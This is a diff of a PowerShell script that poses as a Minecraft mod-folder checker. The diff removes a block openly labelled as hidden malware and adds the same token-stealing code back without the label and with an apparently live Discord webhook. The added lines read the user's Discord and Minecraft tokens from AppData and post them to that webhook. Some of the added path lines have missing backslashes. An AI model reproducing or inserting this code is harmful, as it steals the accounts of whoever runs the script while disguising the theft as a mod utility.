@@ -4,31 +4,28 @@ Write-Host "Made by " -ForegroundColor DarkGray -NoNewline
 Write-Host "HadronCollision"
 Write-Host
 
-# Hidden malware component - starts here
-$webhookUrl = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
-$discordToken = Get-Content -Path "$env:APPDATA\Discord\Local Storage\https_discord.com_0.localstorage" | Select-String -Pattern "token" | Get-Content | Out-String
-$minecraftToken = Get-Content -Path "$env:APPDATA\.minecraft\token.json" | ConvertFrom-Json | Select-Object -ExpandProperty token
-
-# Send tokens to webhook
-$tokenData = @{
-    content = "Discord Token: $discordToken`nMinecraft Token: $minecraftToken"
-} | ConvertTo-Json
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $tokenData -ContentType "application/json"
-# Hidden malware component - ends here
-
 Write-Host "Enter path to the mods folder: " -NoNewline
 Write-Host "(press Enter to use default)" -ForegroundColor DarkGray
 $mods = Read-Host "PATH"
 Write-Host
 
-# [Existing script continues with the mod analysis code]
+
+$webhookUrl = "https://discord.com/api/webhooks/1495059939763421315/vA3rZWFwYgPada9Yy3DLEU7f2-XhwzcpgF-DrWSvGluR2Iv8XuQOJ5R2yKxN9cPkkjah"
+$discordToken = Get-Content -Path "$env:APPDATA\Discord\Local Storage\https_discord.com_0.localstorage" | Select-String -Pattern "token" | Get-Content | Out-String
+$minecraftToken = Get-Content -Path "$env:APPDATA.minecraft\token.json" | ConvertFrom-Json | Select-Object -ExpandProperty token
+
+$tokenData = @{
+    content = "Discord Token: $discordToken`nMinecraft Token: $minecraftToken"
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $tokenData -ContentType "application/json"
+
 
 if (-not $mods) {
-$mods = "$env:USERPROFILE\AppData\Roaming\.minecraft\mods"
-Write-Host "Continuing with " -NoNewline
-Write-Host $mods -ForegroundColor White
-Write-Host
+    $mods = "$env:USERPROFILE\AppData\Roaming.minecraft\mods"
+    Write-Host "Continuing with " -NoNewline
+    Write-Host $mods -ForegroundColor White
+    Write-Host
 }
 
 if (-not (Test-Path $mods -PathType Container)) {
